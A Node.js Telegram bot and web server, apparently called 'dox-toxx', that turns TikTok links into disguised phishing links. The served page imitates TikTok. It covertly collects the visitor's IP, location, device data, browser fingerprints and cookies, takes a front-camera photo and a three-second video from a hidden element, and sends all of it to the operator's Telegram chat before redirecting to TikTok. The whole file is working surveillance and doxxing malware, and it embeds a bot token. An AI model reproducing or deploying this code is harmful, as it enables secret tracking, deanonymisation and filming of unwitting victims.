const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = 'https://dox-toxx.onrender.com'; 

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

// Увеличиваем лимит для передачи видео в base64
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok в личку.');
});

bot.on('message', (msg) => {
  if (msg.chat.type !== 'private') return;
  
  const text = msg.text;
  if (!text || text.startsWith('/')) return;

  if (text.includes('tiktok.com')) {
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const fakeLink = `${DOMAIN}/${shortId}/`;
    
    bot.sendMessage(msg.chat.id, 'Ссылка готова:', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
      }
    });
  }
});

app.get('/', (req, res) => {
  res.redirect('https://www.tiktok.com/');
});

// Прием данных
app.post('/api/collect', async (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    let text = `🚨 **НОВЫЙ ПЕРЕХВАТ** 🚨\n\n`;
    text += `**IP:** ${ip}\n`;
    text += `**Гео:** ${data.geo?.country || '?'}, ${data.geo?.city || '?'}\n`;
    text += `**Провайдер:** ${data.geo?.isp || '?'}\n`;
    text += `**Устройство:** ${data.browser?.os || '?'} / ${data.browser?.browser || '?'}\n`;
    text += `**Экран:** ${data.phone?.screen || '?'} (DPR: ${data.phone?.dpr || '?'})\n`;
    text += `**CPU:** ${data.phone?.cores || '?'} ядер / **RAM:** ${data.phone?.ram || '?'} GB\n`;
    text += `**Батарея:** ${data.battery?.level || '?'} (${data.battery?.charging ? 'заряжается' : 'не заряжается'})\n`;
    text += `**Сеть:** ${data.phone?.network || '?'}\n`;
    text += `**Язык:** ${data.browser?.lang || '?'}\n`;
    text += `**Canvas Hash:** ${data.fingerprint?.canvas || '?'}\n`;
    text += `**GPU:** ${data.fingerprint?.gpu || '?'}\n`;
    text += `**Audio Hash:** ${data.fingerprint?.audio || '?'}\n`;
    text += `**Шрифты:** ${data.fingerprint?.fonts || '?'}\n`;
    text += `**Cookies:** ${data.cookies ? data.cookies.slice(0, 100) + '...' : 'нет'}\n`;
    text += `**Источник:** ${data.browser?.ref || 'прямой'}\n`;
    text += `**Цель:** ${data.target || '?'}\n`;

    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });

    // Отправка фото
    if (data.photo && data.photo.startsWith('data:image')) {
      const base64Data = data.photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendPhoto(CHAT_ID, buffer, { caption: '📷 Фото с камеры' });
    }

    // Отправка видео
    if (data.video && data.video.startsWith('data:video')) {
      const base64Data = data.video.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendVideo(CHAT_ID, buffer, { caption: '🎥 Видео с камеры (3 сек)' });
    }

    res.json({ ok: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false });
  }
});

app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) return res.redirect('https://www.tiktok.com/');

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: sans-serif; color: #000; margin: 0; padding: 0; }
  .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
  .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
  .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
  .header-info { flex: 1; }
  .header-info .name { font-weight: 600; font-size: 16px; margin-bottom: 2px; }
  .header-info .desc { font-size: 13px; color: #666; }
  .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
  .content { padding: 20px; max-width: 600px; margin: 0 auto; }
  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
  
  /* Скрываем видео, чтобы камера не давала черный экран */
  #preview, #canvas { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
</style>
</head>
<body>
<div class="header">
  <div class="avatar-lg"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
  <div class="header-info">
    <div class="name">TikTok</div>
    <div class="desc">Приєднуйся до мене в TikTok</div>
  </div>
  <button class="btn-red" id="btnOpen">Открыть</button>
</div>
<div class="content">
  <div class="skeleton-box"></div>
</div>

<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
    if (tg.requestCameraAccess) tg.requestCameraAccess((granted) => { console.log("Camera access:", granted); });
  }

  const video = document.getElementById('preview');
  const canvas = document.getElementById('canvas');

  // --- Сбор данных ---
  async function collectAll() {
    const data = { browser: {}, phone: {}, geo: {}, battery: {}, fingerprint: {} };
    
    data.cookies = document.cookie || '';
    const ua = navigator.userAgent;
    data.browser.os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
    data.browser.browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
    data.browser.lang = navigator.language;
    data.browser.ref = document.referrer || '';

    data.phone.screen = screen.width + 'x' + screen.height;
    data.phone.dpr = window.devicePixelRatio;
    data.phone.cores = navigator.hardwareConcurrency || '?';
    data.phone.ram = navigator.deviceMemory || '?';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    data.phone.network = conn ? conn.effectiveType + ' (' + conn.downlink + 'Mb/s)' : 'Unknown';

    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        data.battery.level = Math.round(b.level * 100) + '%';
        data.battery.charging = b.charging;
      } catch(e){}
    }

    try {
      const r = await fetch('https://ipwho.is/');
      const g = await r.json();
      if (g.success) {
        data.geo.country = g.country;
        data.geo.city = g.city;
        data.geo.isp = g.connection.isp;
      }
    } catch(e){}

    try {
      const c = document.createElement('canvas');
      c.width = 200; c.height = 40;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20);
      ctx.fillStyle = '#069'; ctx.fillText('FP 🎨', 2, 4);
      const d = c.toDataURL();
      let hash = 0;
      for (let i = 0; i < d.length; i++) hash = (hash * 31 + d.charCodeAt(i)) | 0;
      data.fingerprint.canvas = hash.toString(16);
    } catch(e){}

    try {
      const gl = document.createElement('canvas').getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      data.fingerprint.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    } catch(e){}

    try {
      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (AC) {
        const ctx = new AC(1, 44100, 44100);
        const osc = ctx.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
        const comp = ctx.createDynamicsCompressor();
        osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
        const buf = await ctx.startRendering();
        const ch = buf.getChannelData(0);
        let sum = 0; for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
        data.fingerprint.audio = sum.toString().slice(0, 15);
      }
    } catch(e){}

    try {
      const base = ['monospace', 'sans-serif', 'serif'];
      const test = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Roboto', 'Segoe UI'];
      const span = document.createElement('span');
      span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
      span.textContent = 'mmmmmmmmmmlli';
      document.body.appendChild(span);
      const baseSizes = {};
      for (const b of base) { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth + 'x' + span.offsetHeight; }
      const found = [];
      for (const f of test) {
        for (const b of base) {
          span.style.fontFamily = '"' + f + '",' + b;
          if (span.offsetWidth + 'x' + span.offsetHeight !== baseSizes[b]) { found.push(f); break; }
        }
      }
      document.body.removeChild(span);
      data.fingerprint.fonts = found.join(', ');
    } catch(e){}

    return data;
  }

  // --- Запись фото и видео ---
  async function takePhotoAndVideo() {
    let stream = null;
    let videoBlob = null;
    
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
      video.srcObject = stream;
      video.muted = true;
      await video.play();
      await new Promise(r => setTimeout(r, 500));
      
      // 1. Делаем фото
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
      const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));

      // 2. Записываем видео 3 секунды
      if (typeof MediaRecorder !== 'undefined') {
        const mime = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        const rec = new MediaRecorder(stream, { mimeType: mime });
        const chunks = [];
        rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        
        const videoDone = new Promise(res => { rec.onstop = () => { videoBlob = new Blob(chunks, { type: rec.mimeType }); res(); }; });
        
        rec.start();
        await new Promise(r => setTimeout(r, 3000)); // Ждем 3 секунды
        rec.stop();
        await videoDone;
      }

      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      
      return { photoBlob, videoBlob };
    } catch (e) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      return { photoBlob: null, videoBlob: null };
    }
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
  }

  document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
  
  // Даем 6 секунд на сбор данных, фото и запись видео
  setTimeout(goTarget, 6000);

  // --- Запуск ---
  (async () => {
    const mediaPromise = takePhotoAndVideo();
    const data = await collectAll();
    const { photoBlob, videoBlob } = await mediaPromise;
    
    let photoBase64 = null;
    let videoBase64 = null;

    if (photoBlob) {
      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
    }
    if (videoBlob) {
      videoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(videoBlob); });
    }
    
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ...data, photo: photoBase64, video: videoBase64, target: TARGET_URL })
    }).catch(() => {});
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => { console.log(`Port ${PORT}`); });
